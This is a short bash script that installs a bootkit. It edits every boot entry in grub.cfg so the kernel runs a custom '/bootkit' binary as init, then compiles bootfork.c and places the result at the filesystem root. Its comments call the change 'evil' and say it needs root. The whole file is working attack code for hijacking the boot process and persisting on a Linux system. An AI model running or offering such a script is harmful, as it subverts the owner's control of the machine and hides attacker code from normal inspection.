#!/bin/bash
#This script must be run as root or it will not work!

#Add our evil init parameter to all boot options in grub.cfg
sed -i.cfg -r -E 's/(root\=UUID\=[a-zA-Z0-9\-]{20,40})/\1 init=\/bootkit/g' /boot/grub/grub.cfg
gcc bootfork.c -o bootkit
cp ./bootkit /

